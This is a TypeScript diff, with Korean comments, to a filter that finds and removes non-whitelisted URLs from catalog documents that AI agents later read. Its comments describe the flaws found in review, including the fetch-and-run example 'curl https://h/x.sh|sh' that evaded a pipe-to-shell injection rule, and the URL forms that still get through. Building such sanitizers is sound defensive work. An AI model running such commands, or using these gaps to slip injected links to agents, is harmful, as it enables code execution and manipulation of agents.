@@ -95,7 +95,40 @@ export const DEFAULT_ALLOWED_URL_DOMAINS: readonly string[] = [
   "github.com",
 ];
 
-const URL_PATTERN = /https?:\/\/([a-zA-Z0-9.-]+)(?::\d+)?(?:[/?#][^\s)"'<>]*)?/g;
+/**
+ * URL 추출 패턴. **다섯 구멍을 닫은 형태다(2026-08-24 실측 · 보안 심사 H1·H2)** — 셋 다 파괴 실험으로 발견했고,
+ * 그중 첫 번째는 거부를 제거로 바꾸면서 **회귀가 됐던** 것이다:
+ *
+ * - **userinfo**(`https://user:pw@host/p`) — 옛 패턴은 `user`를 호스트로 잡아 `https://user`
+ *   까지만 매칭했다. 거부만 하던 시절에는 `user`가 허용목록 밖이라 (엉뚱한 이유로) 거부됐지만,
+ *   제거로 바꾸자 `https://user`만 지워지고 **`:pw@host/p`가 문서에 남은 채 검증을 통과**했다 —
+ *   비밀번호와 진짜 호스트를 달고서. 지금은 userinfo를 건너뛰고 **진짜 호스트**를 캡처한다.
+ * - **대문자 스킴**(`HTTPS://…`) — `i` 플래그가 없어 통째로 놓쳤다. 검출도 제거도 안 됐다.
+ * - **IPv6**(`https://[2001:db8::1]/p`) — 대괄호가 호스트 문자 클래스에 없어 놓쳤다.
+ * - **userinfo에 `@`가 둘 이상**(`https://user@pass@host/p`) — 첫 하드닝은 `@`를 **한 번만**
+ *   건너 진짜 호스트가 그룹 밖으로 밀렸다. `removedHosts`에 호스트 대신 **userinfo 조각**이
+ *   들어가 자격증명이 콘솔·요약으로 샜고(`x-access-token@ghp_…@github.com` 형태는 git 클론
+ *   안내에서 흔하다), 텍스트에는 진짜 호스트가 남았다. **"닫았다"고 적은 주석 바로 아래에
+ *   `@` 하나 더 깊은 같은 결함이 있었다**(심사 H2). 지금은 `[^\s/?#]*`가 탐욕적으로 마지막
+ *   `@`까지 먹는다.
+ * - **경로 문자 클래스가 셸 메타문자를 삼킴** — `|`가 경로에 포함돼
+ *   `curl https://h/x.sh|sh`가 파이프와 `sh`까지 URL 한 덩어리로 매칭됐다. 제거하면 파이프가
+ *   사라져 `curl_pipe_shell` 규칙이 **매칭되지 않는다** — 인젝션 시도가 통과했다(심사 H1).
+ *   지금은 `|` `` ` `` `;` `&` `$` `[` `]`를 경로에서 뺀다. 잘린 잔여(`&b=2` 등)는 호스트가
+ *   없어 무해하고, 인용 마커(`[[cite:…]]`)와 코드 스팬 백틱도 더는 삼켜지지 않는다(심사 L1·L2).
+ *
+ * ⚠️ **여전히 잡지 않는 것**: 프로토콜 상대 URL(`//host/p`) · `javascript:`·`data:`·`hxxp:` ·
+ * 퍼센트 인코딩된 스킴 · IDN 호스트 · 스킴 없는 호스트(`evil.example/x`).
+ *
+ * **"이 변경으로 나빠지지 않았다"는 형태별로만 참이고 문서 단위로는 거짓이다**(심사 M2가
+ * 정정했다). 거부하던 시절에는 매칭되는 URL이 하나라도 있으면 **문서 전체가 거부**돼 이런
+ * 형태를 함께 실은 문서도 부수적으로 격리됐다. 지금은 매칭되는 쪽만 지워지고 나머지를 실은
+ * 문서가 통과한다. 실행 위험은 없다 — 카탈로그 문서는 `textContent`로만 렌더된다. 남는 위험은
+ * 위협모델 그대로 "에이전트가 읽고 따라간다"이며, 넓히려면 오탐(일반 텍스트의 `//`·`:`)을
+ * **먼저 실측**해야 한다. 재지 않고 규칙을 늘리면 이 변경이 없앤 유료 무한 재시도 루프가
+ * 새 부류에서 재발한다.
+ */
+const URL_PATTERN = /https?:\/\/(?:[^\s/?#]*@)?(\[[0-9a-fA-F:.]+\]|[a-zA-Z0-9.-]+)(?::\d+)?(?:[/?#][^\s)"'<>|`;&$\[\]]*)?/gi;
 
 function isDomainAllowed(host: string, allowedDomains: readonly string[]): boolean {
   const normalized = host.toLowerCase();
@@ -119,6 +152,56 @@ export function findOutOfWhitelistUrls(
     }
   }
   return [...found];
+}
+
+/**
+ * 제거된 URL 자리에 남기는 표식. **빈 문자열로 지우지 않는다** — 무언가 있었다는 사실이 남아야 한다.
+ *
+ * 꺾쇠를 쓰지 않는다(심사 L1) — `<링`은 HTML 태그로 파싱되지 않지만(`<` 뒤가 ASCII 알파가
+ * 아니다) 마크다운 링크 목적지 자리(`[t](…)`)에서 각괄호 목적지로 읽혀 엉뚱하게 렌더된다.
+ */
+export const REMOVED_URL_MARKER = "[링크 생략]";
+
+export interface UrlScrubResult {
+  text: string;
+  /** 제거한 URL 수(중복 포함). 0이면 원문 그대로다. */
+  removed: number;
+  /** 제거한 URL의 **호스트**만 중복 없이. 전체 URL은 담지 않는다 — 경로에 토큰이 섞일 수 있다. */
+  removedHosts: string[];
+}
+
+/**
+ * 화이트리스트 밖 URL을 표식으로 치환한다.
+ *
+ * **왜 거부가 아니라 제거인가**(2026-08-24 결정). 후검증은 비허용 URL이 하나라도 있으면 문서를
+ * 통째로 거부했다. 근거는 타당하다 — 서드파티 README의 링크가 카탈로그에 박히면 나중에
+ * 에이전트가 그걸 따라갈 수 있다. 그런데 실측 결과 **남은 대상의 44%(84건 중 37건)** 원문에
+ * 비허용 URL이 있었고(총 320건), 모델이 그것을 인용하면서 매 배치가 **돈을 쓰고 같은 이유로
+ * 실패**했다. 빠져나갈 길 없는 fail-closed는 가드가 아니라 벽이다(안전 원칙 6).
+ *
+ * 제거는 위험을 그대로 없앤다 — 따라갈 대상이 카탈로그에 남지 않는다. 그리고 이 제품이 답하려는
+ * 질문("어떤 상황에 어떤 툴")의 답은 URL에 있지 않다.
+ *
+ * ⚠️ **지시문·실행명령 패턴은 제거하지 않는다.** 그것은 정상 콘텐츠가 아니라 실제 인젝션
+ * 시도이고, 지워서 통과시키면 그 시도가 있었다는 사실까지 사라진다. URL만 다르게 다루는 이유는
+ * README의 링크가 **정상 콘텐츠**이기 때문이다.
+ *
+ * ⚠️ **조용히 지우지 않는다.** 몇 건을 어느 호스트에서 지웠는지 호출자에게 돌려주고, 호출자는
+ * 그것을 기록한다(이 저장소가 반복해서 경계한 "조용히 지움").
+ */
+export function scrubOutOfWhitelistUrls(
+  text: string,
+  allowedDomains: readonly string[] = DEFAULT_ALLOWED_URL_DOMAINS,
+): UrlScrubResult {
+  const removedHosts = new Set<string>();
+  let removed = 0;
+  const scrubbed = text.replace(URL_PATTERN, (url, host: unknown) => {
+    if (typeof host !== "string" || isDomainAllowed(host, allowedDomains)) return url;
+    removed += 1;
+    removedHosts.add(host.toLowerCase());
+    return REMOVED_URL_MARKER;
+  });
+  return { text: scrubbed, removed, removedHosts: [...removedHosts] };
 }
 
 /** ⓓ 자산당 문서 길이 상한 — 증폭(amplification) 방지. */
